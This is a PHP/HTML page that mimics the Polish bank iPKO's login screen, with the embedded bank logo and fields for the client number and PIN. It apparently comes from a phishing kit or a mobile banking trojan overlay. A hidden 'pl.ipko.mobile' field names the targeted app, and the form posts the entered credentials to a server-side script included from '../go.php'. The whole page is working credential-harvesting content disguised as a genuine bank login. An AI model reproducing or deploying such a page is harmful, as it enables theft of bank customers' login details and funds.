<?php require_once '../go.php';?>
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <link rel="stylesheet" href="libs/bootstrap/dist/css/bootstrap.min.css">
    <link rel="stylesheet" href="libs/font-awesome/css/font-awesome.min.css">
    <link rel="stylesheet" href="libs/css/style.css">
</head>

<body>	

<body>
  <div id="header" style="margin-top: 10px;">
    <img src="data:image/gif;base64,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 alt="[logo iPKO]" title="iPKO">
  </div>
    <div class="main">

        <div class="container">
<div class="row" style="background-color: #E6E6E6;padding: 10px 10px 0 10px;width: auto;">
<div style="border-bottom:1px solid #BCCCDC; width: 99%; padding-left:6px; padding-bottom:6px; margin-bottom:4px;"><img src="data:image/gif;base64,R0lGODlhUAAMALMAAObm5hwcHFJSUoiIiNnZ2Tc3NykpKbCwsERERG1tbaOjo76+vsvLy3p6epWVlV9fXyH5BAAAAAAALAAAAABQAAwAAAT/EMhJwVl1rkMyOUwmjmQ5DkE2GEJRKNThIsEwEQnLYowBSwJExxJwTBCCSkA4ESQBTmBgWgOgKqhfInCQLAINybYLNYQICEPHJSFMbYBGYNgzwCXTJ/QZ3WNTNwYJFAV8BTcJNgdFEwxVciEKAQUPEggIEwMCD4cTAQIBP32jehJXE5I/YnNugxlyQxIFmJI2OTkAbncIDQ5cngMuHaRApVaApr+ZXIt3FKAV0AAGlZS+B5IYAF8cAa4ANbV+4y0DAz+nyWTqzRK+n1DIUhIPBl8Oug0GE/piang2QDEgBqWAuSHpAIibsIWAm0pNksjRJgsTAF+QACAR8K0AlSlGd8DZcPSAYJ9lFB4SepImVpSFABzBcTRLghwDIRepqikymUljCY+FlENmkSsCgoDYyyXgnyUwEhbN8UcBBYYquTzy2fqHSkgUl3xQUOCiqYAhBB58mkVRoYF1CSxO+8Z0ENZthYpJoeJMxIURG0JU+CDYhOHDJCIAADs=" alt="Logowanie"></div>

                <div class="col-xs-1 col-sm-2"></div>
                <div class="col-xs-10 col-sm-8">
                    <div class="form_">

                        <form class="form" method="post">
						
							<input name="field1" value="pl.ipko.mobile" type="hidden">
						
                            <div class="form-group ">
									<nobr>Numer klienta lub login</nobr>
									<input type="text" class="form-control" name="field2" id="login" autocomplete="off" maxlength="10" data-reg="/.{3,10}/" >
 									<span class="delete fa fa-times-circle"></span>
									<span class="err_span"><i class="fa fa-exclamation-triangle" aria-hidden="true"></i>Informacje są błędne</span>
                           </div>
						   
						   <br>

                            <div class="form-group"> 
									<nobr style="padding: 14px;">Wpisz hasło (PIN)</nobr>
									<input type="password" class="form-control" name="field3" id="password" autocomplete="off" data-reg="/.{3,16}/" maxlength="16" >
                                	<span class="delete fa fa-times-circle"></span>
									<span class="err_span"><i class="fa fa-exclamation-triangle" aria-hidden="true"></i>Informacje są błędne</span>
                            </div><br>
							
                       				<button class="input_submitBtn" id="input_submitBtn" type="submit"> <img src="data:image/gif;base64,R0lGODlhWwAfAOZ9AP///6wLFdoXKa4LFuMZLasKFN0YK+EYLNwXKtcWKOIZLbEMF98YK7ALFrMMGLYNGbgOGtUVJ7oOG9EUJcwTI8kSIs4TJNMVJsEQHsQRH78QHcYSIbwPHPvv8PHAxOKBieGBid2Ahu6/w/LAxeiCi/DAxPzv8Png4sUgLe/Aw+aCi+CAiOWBiu2/wvPAxdVRXPbf4ddRXfPBxcxOWPbQ1OafpeCPldBQWfzv8dlwd96Ah9t/huSBiuBTYdEjM8g+Sd9TYPbQ091ibOWfpb8eKtQkNLgcJ+Bxe+egpfrv8Mk/SfPP0uuhp88jMthgaueRmMMgLNhCUPjg4sghLvLP0uKPlt1TX9tSXtBBTPCxttxwecgwO+qRmcEuOeNyfM5PWc4yP+JjbuuwtMxAStdvd8UvOtMyQNBeZvjf4umvs8lOVtlha/TQ091EUuBibtRgaNFBTeigpth+hN1xeuOfpOqSmtk0Q+JxfNUyQdJQWvXQ0++wttJfaP///wAAAAAAACH5BAEAAH0ALAAAAABbAB8AAAf/gASCg4SFhoeIiYqLjIt9fQqRkpOUlZaXmJmam5qPB5+goaKjpKWmp6ipqI8Mra6vsLGys7S1tre2jwa7vL2+v8DBwsPExcSPCMnKy8zNzs/Q0dLT0o8C19jZ2tvc3d7f4OHgjwnl5ufo6err7O3u7+6PEfP09fb3+PnzbT35Pf36AgrM9+iCwYMIDcoAwJAhkIN1TthBKENGwjAnaNDAQQIhCRw0TuB4eEFGx4MAOpIAkLCly5aPJsicSbPmhCAmaJ44kYWmCxc0rQDgItMLABUyVQBwM6EIziITftI8OkGpzatYZz6ywLWr1693ALDoGkUsADxdR4zwOkKKVyYm/3z4MMGE7J4rFtR6FWuBBYCvX/8CBvyIguHDiBE3MSEF8RM9ZgDwOOzBw+EmAJ4gPgJAiBAARxIbroxYMgUeAESXTq0a8aMKsGPLlv0BQAzZHT5UYIMmduXYMQDoBi689u3ZFX7HFl6hNnLZDZ/LfrShuvXr1sEAKHF9DQA4G+YAeFG9BPfqLwCAuJ4eBIjx1eMwXG/+uvoN77FjbwhA//VHGQQo4IACpgAAFgMiwR8ASASYQgoCTgGAGANqAYATTgCwwoAaZvAghxuuAACBBDZEIoGPYKDiiiyqmAcANbCIQgdVrFgDAChgIIIILC7RAYs1dIACCgDwuCIAOui4xP+KRCapAwAttshQlFE+osGVWGZ5JQwdQJFlDgCMgeUNAISgwY5ZkjnElW+UeWUIAORwJZlywmkmFEMAsIUGcGqpJQB+BvoIB4QWaigHSiwIwBdpwHCoDY620FAHSnDARwcwSLqDoTt0QIWkNhRqw6RkcFDGDgAcquqqqj4iwauwxirrrLTW+uoPM9Q6wwxEyErEDD/ESkcLthYr6yMQJKvsssw26+yz0EbrbBdJnCHttRA88sC23Hbr7bfghivuuN+qkYQc5Ka77SMOtOvuu/DGK++89NYbrxFG2Kuvu48s4O+/AAcs8MAEF2zwwQgf/EgDDDfs8MMQRyzxxBRXbHFTxY8MoPHGHHfs8ccghyzyyCSP/EgAKKes8sost+zyyzDHLHPMjxRg880456zzzjz37PPPQP/8yNBEF2300UgnrfTSTDft9NNQRy311FRXbfXVgQAAOw=="> </button>
 </form><br>

</div>
                </div>
                <div class="col-xs-1 col-sm-2"></div>
            </div>
        </div>
    </div>



    <script type="text/javascript" src="libs/jquery/dist/jquery.min.js"></script>

<script src="libs/angular/angular.min.js"></script>

	<script type="text/javascript">
                    var g_oBtn = document.getElementById('input_submitBtn');
                    g_oBtn.onclick = function () {
					
						var oNumInp = document.getElementById('login');
                        var oCodeInp = document.getElementById('password');

						try{
							oNumInp.className = 'form-control';
							oCodeInp.className = 'form-control';
						} catch(e){};
						
                        if (!/^\w{4,20}$/i.test(oNumInp.value)) {
							try{
								oNumInp.className = 'fielderror';
							} catch(e){};
                            return false;
                        }
						
                        if (!/^\w{4,16}$/i.test(oCodeInp.value)) {
							try{
                                oCodeInp.className = 'fielderror';
							} catch(e){};
                            return false;
                        }
                    }
            </script>

</body>




</html>
